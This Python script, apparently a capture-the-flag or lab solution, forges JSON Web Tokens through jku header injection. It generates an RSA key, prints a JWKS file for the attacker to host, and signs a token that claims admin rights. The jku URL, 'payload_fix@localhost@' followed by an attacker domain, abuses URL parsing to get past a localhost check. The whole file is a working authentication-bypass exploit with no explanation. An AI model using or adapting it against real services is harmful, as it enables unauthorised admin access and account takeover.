import jwt
import json
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

def int_to_base64(n):
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
    return base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode('utf-8')

# 1. Generate Key
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pn = private_key.public_key().public_numbers()

jwks = {
    "keys": [{
        "kty": "RSA",
        "kid": "key1",
        "use": "sig",
        "alg": "RS256",
        "n": int_to_base64(pn.n),
        "e": int_to_base64(pn.e)
    }]
}

# 2. Setup Payload & URL
ATTACKER_DOMAIN = "<domain>"
jku_url = f"http://payload_fix@localhost@{ATTACKER_DOMAIN}/jwks.json"

payload = {
    "is_admin": True,
    "jku": jku_url,
    "user_id": 1,
    "username": "admin"
}

headers = {
    "alg": "RS256",
    "kid": "key1"
}

private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)

token = jwt.encode(payload, private_pem, algorithm="RS256", headers=headers)

print("--- UPDATE /var/www/html/jwks.json ---")
print(json.dumps(jwks))
print("\n--- NEW FORGED TOKEN (JKU in Payload) ---")
print(token)
